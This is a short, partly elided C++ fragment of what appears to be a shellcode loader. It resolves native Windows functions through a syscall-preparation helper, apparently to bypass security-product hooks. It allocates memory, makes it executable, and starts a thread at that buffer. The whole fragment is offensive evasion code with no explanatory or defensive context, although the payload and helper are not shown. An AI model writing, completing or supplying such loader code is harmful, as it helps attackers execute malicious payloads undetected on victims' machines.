...
int main(int argc, char* argv[]) {
    ...
    PrepareSyscall((char*)"NtAllocateVirtualMemory");
    if (NT_SUCCESS(NtAllocateVirtualMemory((HANDLE)-1, &buffer, 0, &size, MEM_COMMIT, PAGE_READWRITE))) {
    ...
    ULONG oldProtect = 0;
    PrepareSyscall((char*)"NtProtectVirtualMemory");
    if (NT_SUCCESS(NtProtectVirtualMemory((HANDLE)-1, &buffer, &size, PAGE_EXECUTE_READ, &oldProtect))) {
    ...
    PrepareSyscall((char*)"NtCreateThreadEx");
    NTSTATUS status = NtCreateThreadEx(&thread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
